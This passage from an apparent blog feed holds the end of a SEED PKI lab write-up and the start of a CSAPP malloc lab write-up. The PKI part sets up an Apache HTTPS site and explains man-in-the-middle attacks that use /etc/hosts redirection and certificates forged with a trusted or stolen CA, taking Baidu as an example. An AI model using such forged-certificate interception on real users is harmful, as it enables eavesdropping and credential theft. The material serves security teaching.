class="hljs-number">99</span>:<span class="hljs-attribute">bb</span>:<span class="hljs-number">66</span>:<span class="hljs-number">07</span>:<span class="hljs-number">39</span>:<span class="hljs-attribute">bb</span>:<span class="hljs-number">14</span>:a8:e6:<span class="hljs-number">09</span>:<span class="hljs-number">09</span>:<span class="hljs-attribute">ea</span>:<span class="hljs-number">54</span>:e7:<span class="hljs-number">3</span><span class="hljs-attribute">e</span>:<span class="hljs-number">18</span>:<span class="hljs-number">3</span><span class="hljs-attribute">a</span>:<span class="hljs-number">5</span><span class="hljs-attribute">d</span>:<br>         <span class="hljs-number">72</span>:<span class="hljs-number">44</span>:b0:<span class="hljs-number">5</span><span class="hljs-attribute">b</span>:<span class="hljs-number">48</span>:<span class="hljs-number">92</span>:<span class="hljs-number">69</span>:<span class="hljs-number">81</span>:<span class="hljs-number">05</span>:<span class="hljs-attribute">ec</span>:<span class="hljs-number">94</span>:<span class="hljs-attribute">fb</span>:<span class="hljs-number">6</span><span class="hljs-attribute">f</span>:<span class="hljs-number">56</span>:<span class="hljs-number">4</span><span class="hljs-attribute">e</span>:<span class="hljs-number">5</span><span class="hljs-attribute">f</span>:<span class="hljs-number">88</span>:<span class="hljs-number">4</span><span class="hljs-attribute">f</span>:<br>         <span class="hljs-attribute">fe</span>:<span class="hljs-number">5</span><span class="hljs-attribute">f</span>:<span class="hljs-attribute">ac</span>:<span class="hljs-number">55</span>:<span class="hljs-number">33</span>:<span class="hljs-number">3</span><span class="hljs-attribute">e</span>:e1:<span class="hljs-number">27</span>:e0:c2:<span class="hljs-number">66</span>:<span class="hljs-number">5</span><span class="hljs-attribute">c</span>:<span class="hljs-number">70</span>:<span class="hljs-attribute">ea</span>:b6:d1:<span class="hljs-number">0</span><span class="hljs-attribute">e</span>:<span class="hljs-number">71</span>:<br>         <span class="hljs-number">7</span><span class="hljs-attribute">b</span>:<span class="hljs-number">92</span>:f7:<span class="hljs-number">3</span><span class="hljs-attribute">d</span>:<span class="hljs-number">8</span><span class="hljs-attribute">b</span>:a4:<span class="hljs-number">1</span><span class="hljs-attribute">b</span>:<span class="hljs-number">38</span>:<span class="hljs-number">84</span>:d3:c9:<span class="hljs-attribute">ec</span>:<span class="hljs-attribute">db</span>:f1:<span class="hljs-number">63</span>:<span class="hljs-number">89</span>:<span class="hljs-number">5</span><span class="hljs-attribute">a</span>:<span class="hljs-number">5</span><span class="hljs-attribute">a</span>:<br>         <span class="hljs-number">6</span><span class="hljs-attribute">e</span>:<span class="hljs-number">0</span><span class="hljs-attribute">c</span>:<span class="hljs-number">27</span>:<span class="hljs-number">08</span>:d3:<span class="hljs-number">16</span>:<span class="hljs-number">4</span><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span><br><br></code></pre></td></tr></table></figure><h1 id="Task-4-Deploying-Certificate-in-an-Apache-Based-HTTPS-Website"><a href="#Task-4-Deploying-Certificate-in-an-Apache-Based-HTTPS-Website" class="headerlink" title="Task 4: Deploying Certificate in an Apache-Based HTTPS Website"></a>Task 4: Deploying Certificate in an Apache-Based HTTPS Website</h1><p>编辑我们自己网站的apache ssl.conf文件</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ cat apache_ssl<span class="hljs-selector-class">.conf</span> <br>&lt;VirtualHost *:<span class="hljs-number">443</span>&gt; <br>    DocumentRoot /var/www/gls23<br>    ServerName www<span class="hljs-selector-class">.gls23</span><span class="hljs-selector-class">.com</span><br>    ServerAlias www<span class="hljs-selector-class">.gls2023</span><span class="hljs-selector-class">.com</span><br>    ServerAlias www<span class="hljs-selector-class">.gls2024</span><span class="hljs-selector-class">.com</span><br>    DirectoryIndex index<span class="hljs-selector-class">.html</span><br>    SSLEngine On <br>    SSLCertificateFile /certs/server<span class="hljs-selector-class">.crt</span><br>    SSLCertificateKeyFile /certs/server<span class="hljs-selector-class">.key</span><br>&lt;/VirtualHost&gt;<br><span class="hljs-selector-attr">[06/22/23]</span>seed@VM:~/.../image_www$ <br><br></code></pre></td></tr></table></figure><p>可以看到第九行、第十行需要文件。因此把server.crt和server.key复制到容器的certs文件夹</p><p>编辑一下容器的Dockerfile，如下</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">FROM</span> dockerproxy.com<span class="hljs-regexp">/handsonsecurity/</span>seed-server:apache-php<br>  <br>ARG WWWDIR=<span class="hljs-regexp">/var/</span>www/gls23<br><br><span class="hljs-keyword">COPY</span> .<span class="hljs-regexp">/index.html ./i</span>ndex_red.html $WWWDIR/<br><span class="hljs-keyword">COPY</span> .<span class="hljs-regexp">/apache_ssl.conf /</span>etc<span class="hljs-regexp">/apache2/</span>sites-available<br><span class="hljs-keyword">COPY</span> .<span class="hljs-regexp">/certs/</span>server.crt .<span class="hljs-regexp">/certs/</span>server.key  <span class="hljs-regexp">/certs/</span><br><br>RUN  chmod <span class="hljs-number">400</span> <span class="hljs-regexp">/certs/</span>server.key \<br>     &amp;&amp; chmod <span class="hljs-number">644</span> $WWWDIR/index.html \<br>     &amp;&amp; chmod <span class="hljs-number">644</span> $WWWDIR/index_red.html \<br>     &amp;&amp; a2enmod ssl \<br>     &amp;&amp; a2ensite apache_ssl <br>     <br><br>CMD  tail -f <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span><br><br></code></pre></td></tr></table></figure><p>下面构建容器镜像、运行容器、进入容器内部、启动Apache服务</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> dcbuild<br><br><span class="hljs-variable">$</span> dcup<br><br><span class="hljs-variable">$</span> docker image <span class="hljs-built_in">ls</span> <br><br><span class="hljs-variable">$</span> docker <span class="hljs-built_in">ps</span> <br><br><span class="hljs-variable">$</span> docksh <span class="hljs-comment"># 进入容器内部</span><br><br><span class="hljs-variable">$</span> service apache2 <span class="hljs-built_in">start</span> <br></code></pre></td></tr></table></figure><p><img src="https://img.gls.show/img/image-20230623155309100.png"></p><p>在Firefox中输入about:preferences#privacy，在Authorities tab导入我们的CA并选择Trust this CA to identify web sites，最后访问<a href="https://www.example.com/">https://www.example.com</a>  即可</p><h1 id="Task-5-Launching-a-Man-In-The-Middle-Attack"><a href="#Task-5-Launching-a-Man-In-The-Middle-Attack" class="headerlink" title="Task 5: Launching a Man-In-The-Middle Attack"></a>Task 5: Launching a Man-In-The-Middle Attack</h1><blockquote><p>中间人攻击通常发生在安全通信的建立阶段，例如使用SSL/TLS加密的HTTPS连接。攻击者会冒充服务器与客户端建立连接，同时与服务器和客户端分别建立独立的连接。攻击者可以生成自己的伪造证书，与客户端建立安全连接并将自己的伪造证书发送给客户端，同时与服务器建立另一个安全连接并将客户端的请求发送给服务器。这样，攻击者就能够在客户端和服务器之间的通信中拦截、查看和修改数据。</p><p>为了防止中间人攻击，通常使用证书颁发机构（CA）签发的可信证书来验证服务器的身份。客户端会对服务器的证书进行验证，包括验证证书的有效性、合法性和所属的颁发机构等。</p></blockquote><p>几种方法可以让用户的 HTTPS 请求到达我们的 Web 服务器。</p><ul><li>一种方法是攻击路由，这样用户的 HTTPS 请求就被路由到我们的 Web 服务器。</li><li>另一种方法是攻击 DNS，所以当受害者的机器试图找出目标网络服务器的 IP 地址，它得到我们的网络服务器的 IP 地址。</li></ul><p>在这个任务中，我们模拟了攻击-DNS 的方法。我们只需修改受害者机器的/etc/hosts 文件，通过将主机名 <a href="http://www.example.com/">www.example.com</a> 映射到我们的恶意网络服务器，来模拟 DNS 缓存定位攻击的结果，而不是启动一个实际的 DNS 域名服务器缓存污染。</p><p>task4中，已经建立了一个 HTTPS 网站，这个任务中使用相同的 Apache 服务器来模拟 <a href="http://www.example.com/">www.example.com</a> 。方法类似按照 Task 4中的指令向 Apache 的 SSL 配置文件添加一个 VirtualHost 条目: ServerName 应该是 <a href="http://www.example.com/">www.example.com</a></p><p>举个例子，可以将baidu.com映射到我们自己的服务器上，让受害者以为自己访问了百度，但是其实是访问了我们的恶意服务器</p><p>我们可以使用之前生成的自签名CA给百度签一个证书，如果浏览器加载了我们的CA，那么受害者访问百度的时候，就会显示https正常，通过了证书核验</p><h1 id="Task-6-Launching-a-Man-In-The-Middle-Attack-with-a-Compromised-CA"><a href="#Task-6-Launching-a-Man-In-The-Middle-Attack-with-a-Compromised-CA" class="headerlink" title="Task 6: Launching a Man-In-The-Middle Attack with a Compromised CA"></a>Task 6: Launching a Man-In-The-Middle Attack with a Compromised CA</h1><blockquote><p>在这个任务中，我们假设在 Task 1中创建的根 CA 受到攻击者的攻击，并且它的私钥被盗取了。因此，攻击者可以使用此 CA 的私钥生成任意证书。在这项任务中，我们将看到这种妥协的后果。请设计一个实验来证明攻击者可以成功地在任何 HTTPS 网站上启动 MITM 攻击。您可以使用在 Task 5中创建的相同设置，但是这一次，您需要证明 MITM 攻击是成功的，也就是说，当受害者试图访问一个网站但是登录到 MITM 攻击者的假网站时，浏览器不会引起任何怀疑。</p></blockquote><p>在task5中的叙述描述了我们使用自己的<strong>自签名CA导入到浏览器</strong>的情况，但是如果<strong>根CA私钥</strong>被盗取了会有更严重的后果：</p><ol><li>伪造证书：攻击者可以使用根证书的私钥签发伪造的证书，模拟合法的网站或服务，使其看起来具有合法的身份和可信的安全性。这将导致用户误认为与真实网站或服务进行通信，从而暴露他们的敏感信息。</li><li>中间人攻击：通过拦截通信并使用伪造的证书，攻击者可以进行中间人攻击，监视和修改通信内容，窃取敏感信息或注入恶意内容。这对用户、网站和系统的安全性构成了严重威胁。</li><li>篡改和劫持：攻击者可以篡改通过伪造证书进行加密的通信内容，例如修改下载文件、注入恶意代码或劫持用户的会话。</li><li>信任破裂：如果根证书的私钥被盗取，信任链中的所有证书都将受到威胁，导致整个系统的信任破裂。这将对证书基础设施的安全性和可信度产生长期的负面影响。</li></ol><p>实验步骤与之前类似，使用根CA签名证书，伪造证书在浏览器进行访问时不许任何设置都会被信任</p>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP-lab：malloc lab</title>
    <link href="/p/2c54864f/"/>
    <url>/p/2c54864f/</url>
    
    <content type="html"><![CDATA[<h1 id="lab说明"><a href="#lab说明" class="headerlink" title="lab说明"></a>lab说明</h1><blockquote><p>下面是对lab说明文档的总结</p></blockquote><h2 id="评测"><a href="#评测" class="headerlink" title="评测"></a>评测</h2><p>在<code>malloclab-handout.tar</code>发行版中的驱动程序<code>mdriver.c</code>将测试<code>mm.c</code>包的正确性、空间利用率和吞吐量。驱动程序由一组跟踪文件控制，这些文件包含在<code>malloclab-handout.tar</code>分发版中。每个跟踪文件都包含一系列分配、重新分配和释放指令，指示驱动程序以某种顺序调用您的<code>mm_malloc</code>、<code>mm_realloc</code>和<code>mm_free</code>例程。驱动程序和跟踪文件与我们为您的提交<code>mm.c</code>文件评分时将使用的相同。</p><p>驱动程序<code>mdriver.c</code>接受以下命令行参数：</p><ul><li><code>-t &lt;tracedir&gt;</code>：在目录<code>tracedir</code>而不是<code>config.h</code>中定义的默认目录中查找默认跟踪文件。</li><li><code>-f &lt;tracefile&gt;</code>：使用一个特定的跟踪文件代替默认的跟踪文件集进行测试。</li><li><code>-h</code>：打印命令行参数的摘要。</li><li><code>-l</code>：除了学生的<code>malloc</code>包之外，还运行和测量<code>libc malloc</code>。</li><li><code>-v</code>：详细输出。在紧凑表中打印每个跟踪文件的性能分解。</li><li><code>-V</code>：更详细的输出。在处理每个跟踪文件时打印附加诊断信息。对于确定哪个跟踪文件导致您的<code>malloc</code>包失败很有用。</li></ul><p>运行<code>./mdriver -t ./traces -v</code>，即可使用指定的trace文件夹下的文件进行评测，-v打印性能输出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">make clean<br><br>make <br><br>./mdriver -t ./traces -v<br></code></pre></td></tr></table></figure><p>原始代码的评测输出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">$ ./mdriver -t ./traces -v<br>Team Name:ateam<br>Member <span class="hljs-number">1</span> :Harry Bovik:bovik@cs.cmu.edu<br>Using <span class="hljs-keyword">default</span> tracefiles in ./traces/<br><span class="hljs-function">Measuring performance with <span class="hljs-title">gettimeofday</span><span class="hljs-params">()</span>.</span><br><span class="hljs-function">ERROR: mem_sbrk failed. Ran out of memory...</span><br><span class="hljs-function">ERROR [trace 4, line 7673]: mm_malloc failed.</span><br><span class="hljs-function">ERROR: mem_sbrk failed. Ran out of memory...</span><br><span class="hljs-function">ERROR [trace 5, line 1662]: mm_malloc failed.</span><br><span class="hljs-function">ERROR: mem_sbrk failed. Ran out of memory...</span><br><span class="hljs-function">ERROR [trace 6, line 1780]: mm_malloc failed.</span><br><span class="hljs-function">ERROR: mem_sbrk failed. Ran out of memory...</span><br><span class="hljs-function">ERROR [trace 9, line 1705]: mm_realloc failed.</span><br><span class="hljs-function">ERROR: mem_sbrk failed. Ran out of memory...</span><br><span class="hljs-function">ERROR [trace 10, line 6562]: mm_realloc failed.</span><br><span class="hljs-function"></span><br><span class="hljs-function">Results <span class="hljs-keyword">for</span> mm <span class="hljs-built_in">malloc</span>:</span><br><span class="hljs-function">trace  valid  util     ops      secs  Kops</span><br><span class="hljs-function"> 0       yes   23%    5694  0.000021268585</span><br><span class="hljs-function"> 1       yes   19%    5848  0.000018332273</span><br><span class="hljs-function"> 2       yes   30%    6648  0.000020339184</span><br><span class="hljs-function"> 3       yes   40%    5380  0.000015349351</span><br><span class="hljs-function"> 4        no     -       -         -     -</span><br><span class="hljs-function"> 5        no     -       -         -     -</span><br><span class="hljs-function"> 6        no     -       -         -     -</span><br><span class="hljs-function"> 7       yes   55%   12000  0.000031382166</span><br><span class="hljs-function"> 8       yes   51%   24000  0.000070340909</span><br><span class="hljs-function"> 9        no     -       -         -     -</span><br><span class="hljs-function">10        no     -       -         -     -</span><br><span class="hljs-function">Total            -       -         -     -</span><br></code></pre></td></tr></table></figure><p>看一下short1-bal.rep文件的内容：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">20000</span><br><span class="hljs-attribute">6</span><br><span class="hljs-attribute">12</span><br><span class="hljs-attribute">1</span><br><span class="hljs-attribute">a</span> <span class="hljs-number">0</span> <span class="hljs-number">2040</span><br><span class="hljs-attribute">a</span> <span class="hljs-number">1</span> <span class="hljs-number">2040</span><br><span class="hljs-attribute">f</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">a</span> <span class="hljs-number">2</span> <span class="hljs-number">48</span><br><span class="hljs-attribute">a</span> <span class="hljs-number">3</span> <span class="hljs-number">4072</span><br><span class="hljs-attribute">f</span> <span class="hljs-number">3</span><br><span class="hljs-attribute">a</span> <span class="hljs-number">4</span> <span class="hljs-number">4072</span><br><span class="hljs-attribute">f</span> <span class="hljs-number">0</span><br><span class="hljs-attribute">f</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">a</span> <span class="hljs-number">5</span> <span class="hljs-number">4072</span><br><span class="hljs-attribute">f</span> <span class="hljs-number">4</span><br><span class="hljs-attribute">f</span> <span class="hljs-number">5</span><br><br></code></pre></td></tr></table></figure><h2 id="函数说明"><a href="#函数说明" class="headerlink" title="函数说明"></a>函数说明</h2><p>mm.c中有下面几个函数：</p><p>mm_init：执行任何必要的初始化</p><p>mm_malloc：mm_malloc 例程返回指向至少 size 个字节的已分配块有效载荷的指针。整个分配的块应该位于堆区域内并且不应该与任何其他分配的块重叠。由于 libc malloc 始终返回与 8 字节对齐的有效负载指针，因此您的 malloc 实现也应该这样做并始终返回 8 字节对齐的指针。</p><p>mm_free：mm_free 例程释放 ptr 指向的块。它什么都不返回。只有在先前调用 mm_malloc 或 mm_realloc 返回传递的指针 (ptr) 且尚未释放时，此例程才能保证工作。</p><p>mm_realloc：mm_realloc(void *ptr, size_t size) 例程返回一个指向至少 size 个字节的已分配区域的指针</p><p>memlib.c中有我们可以使用的函数</p><ul><li><code>void *mem_sbrk(int incr)</code>: 将堆扩展<code>incr</code>字节，其中<code>incr</code>是正非零整数，并返回指向新分配的堆区域的第一个字节的通用指针。语义与Unix’sbrk函数相同，除了<code>mem_sbrk</code>只接受正的非零整数参数。</li><li><code>void *mem_heap_lo(void)</code>: 返回指向堆中第一个字节的通用指针。</li><li><code>void *mem_heap_hi(void)</code>: 返回指向堆中最后一个字节的通用指针。</li><li><code>size_t mem_heapsize(void)</code>: 返回堆的当前大小(以字节为单位)。</li><li><code>size_t mem_pagesize(void)</code>: 返回系统的页面大小(以字节为单位)(Linux系统为4K)。</li></ul><h2 id="编程规则"><a href="#编程规则" class="headerlink" title="编程规则"></a>编程规则</h2><ul><li>您不应更改<code>mm.c</code>中的任何接口。</li><li>您不应调用任何与内存管理相关的库调用或系统调用。这不包括在您的代码中使用<code>malloc</code>、<code>calloc</code>、<code>free</code>、<code>realloc</code>、<code>sbrk</code>、<code>brk</code>或这些调用的任何变体。</li><li>您不得在<code>mm.c</code>程序中定义任何全局或静态复合数据结构，例如数组、结构、树或列表。但是，您可以在<code>mm.c</code>中声明全局标量变量，例如整数、浮点数和指针。</li><li>为了与返回8字节边界对齐的块的<code>libc malloc</code>包保持一致，您的分配器必须始终返回与8字节边界对齐的指针。驱动程序会为您强制执行此要求。</li></ul><blockquote><p>在实施时，建议分阶段进行。前9个跟踪包含对<code>malloc</code>和<code>free</code>的请求。最后2个跟踪包含对<code>realloc</code>、<code>malloc</code>和<code>free</code>的请求。我们建议您首先让您的<code>malloc</code>和<code>free</code>例程在前9个跟踪上正确有效地工作。只有这样，您才应该将注意力转移到<code>realloc</code>实现上。初学者可以在现有的<code>malloc</code>和<code>free</code>实现之上构建<code>realloc</code>。但是，要获得真正好的性能，您需要构建一个独立的<code>realloc</code>。最后，使用分析器(如gprof)可以帮助您优化性能。</p></blockquote><h1 id="隐式空闲链表实现"><a href="#隐式空闲链表实现" class="headerlink" title="隐式空闲链表实现"></a>隐式空闲链表实现</h1><h2 id="宏"><a href="#宏" class="headerlink" title="宏"></a>宏</h2><p>为了降低复杂性并减少可能的错误，建议将指针算法封装在C预处理器宏中。正如书中提到的，内存管理器中的指针算法令人困惑且容易出错，可以通过为指针操作编写宏来显着降低复杂性</p><table><thead><tr><th>宏名称</th><th>宏定义</th><th>作用</th></tr></thead><tbody><tr><td>GET</td><td><code>(*(unsigned int *)(p))</code></td><td>读取地址p处的unsigned int类型的值</td></tr><tr><td>PUT</td><td><code>(*(unsigned int *)(p) = (val))</code></td><td>将unsigned int类型的值val存储到地址p处</td></tr><tr><td>GET_SIZE</td><td><code>(GET(p) &amp; ~0x7)</code></td><td>从地址p处读取unsigned int类型的值，并忽略最后三位，得到块的大小</td></tr><tr><td>GET_ALLOC</td><td><code>(GET(p) &amp; 0x1)</code></td><td>从地址p处读取unsigned int类型的值，并获取最后一位，判断该块是否已分配</td></tr><tr><td>HDRP</td><td><code>((char *)(bp) - WSIZE)</code></td><td>给定块指针bp，计算出该块的头部地址</td></tr><tr><td>FTRP</td><td><code>((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)</code></td><td>给定块指针bp，计算出该块的脚部地址</td></tr><tr><td>NEXT_BLKP</td><td><code>((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE)))</code></td><td>给定块指针bp，计算出下一个块的地址</td></tr><tr><td>PREV_BLKP</td><td><code>((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE)))</code></td><td>给定块指针bp，计算出前一个块的地址</td></tr></tbody></table><p>理解上面的宏的前提是理解分配的堆的内存块的结构</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202305312110226.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* single word (4) or double word (8) alignment */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ALIGNMENT 8</span><br><br><span class="hljs-comment">/* rounds up to the nearest multiple of ALIGNMENT */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ALIGN(size) (((size) + (ALIGNMENT - 1)) &amp; ~0x7) <span class="hljs-comment">// ~0x7是0xFFFFFFF8，这里向上舍入到 8 的倍数</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SIZE_T_SIZE (ALIGN(sizeof(size_t)))</span><br><br><span class="hljs-comment">/* Basic constants and macros */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WSIZE 4             <span class="hljs-comment">/* Word and header/footer size (bytes) */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DSIZE 8             <span class="hljs-comment">/* Double word size (bytes) 或者，header+footer的大小*/</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CHUNKSIZE (1 &lt;&lt; 12) <span class="hljs-comment">/* Extend heap by this amount (bytes) 4096字节*/</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX(x, y) ((x) &gt; (y) ? (x) : (y))</span><br><br><span class="hljs-comment">/* Pack a size and allocated bit into a word */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PACK(size, alloc) ((size) | (alloc))</span><br><br><span class="hljs-comment">/* 获取p地址处保存的unsigned int的值 Read and write a word at address p */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> GET(p) (*(unsigned int *)(p))</span><br><span class="hljs-comment">/* 将val的值以unsigned int存储到p地址处*/</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PUT(p, val) (*(unsigned int *)(p) = (val))</span><br><br><span class="hljs-comment">/* 读取p地址处保存的unsigned int的值，忽略最后三位 Read the size and allocated fields from address p */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> GET_SIZE(p) (GET(p) &amp; ~0x7)</span><br><span class="hljs-comment">/* 获取p地址处保存的unsigned int的值的最后一位，也即该块是否分配*/</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> GET_ALLOC(p) (GET(p) &amp; 0x1)</span><br><br><span class="hljs-comment">/* 获取bp地址处对应的块的头部的指针，char *类型，bp：块指针  减：往头部走 加：往脚部走 Given block ptr bp, compute address of its header and footer */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> HDRP(bp) ((char *)(bp) - WSIZE)</span><br><span class="hljs-comment">/* 获取bp地址处对应的块的脚部的指针，char *类型，要注意，头/脚部保存的大小是一整个块，包含头脚部和payload的所有的大小 */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)</span><br><br><span class="hljs-comment">/* 获取bp地址处对应的块的下一个块的块指针 Given block ptr bp, compute address of next and previous blocks */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE)))</span><br><span class="hljs-comment">/* 获取bp地址处对应的块的前一个块的块指针 */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PREV_BLKP(bp) ((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE)))</span><br><br></code></pre></td></tr></table></figure><h2 id="mm-init"><a href="#mm-init" class="headerlink" title="mm_init"></a>mm_init</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * mm_init - initialize the malloc package.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">mm_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-comment">/* Create the initial empty heap */</span><br>    <span class="hljs-keyword">if</span> ((heap_listp = mem_sbrk(<span class="hljs-number">4</span> * WSIZE)) == (<span class="hljs-keyword">void</span> *)<span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    PUT(heap_listp, <span class="hljs-number">0</span>);                            <span class="hljs-comment">/* Alignment padding */</span><br>    PUT(heap_listp + (<span class="hljs-number">1</span> * WSIZE), PACK(DSIZE, <span class="hljs-number">1</span>)); <span class="hljs-comment">/* 序言块 头部 8/1 Prologue header */</span><br>    PUT(heap_listp + (<span class="hljs-number">2</span> * WSIZE), PACK(DSIZE, <span class="hljs-number">1</span>)); <span class="hljs-comment">/* 序言块 脚部 8/1 Prologue footer */</span><br>    PUT(heap_listp + (<span class="hljs-number">3</span> * WSIZE), PACK(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>));     <span class="hljs-comment">/* 尾声块 头部 0/1 Epilogue header */</span><br>    heap_listp += (<span class="hljs-number">2</span> * WSIZE);<br><br>    <span class="hljs-comment">/* Extend the empty heap with a free block of CHUNKSIZE bytes */</span><br>    <span class="hljs-keyword">if</span> (extend_heap(CHUNKSIZE / WSIZE) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>mm_init函数负责堆的初始化工作</p><p>mm_init函数先调用mem_sbrk函数分配堆的初始空间，大小为4个字，依次是</p><ul><li>padding</li><li>序言块 头部 8/1 Prologue header</li><li>序言块 脚部 8/1 Prologue footer</li><li>尾声块 头部 0/1 Epilogue header</li></ul><p>下面看一下mem_sbrk函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * mem_sbrk - simple model of the sbrk function. Extends the heap </span><br><span class="hljs-comment"> *    by incr bytes and returns the start address of the new area. In</span><br><span class="hljs-comment"> *    this model, the heap cannot be 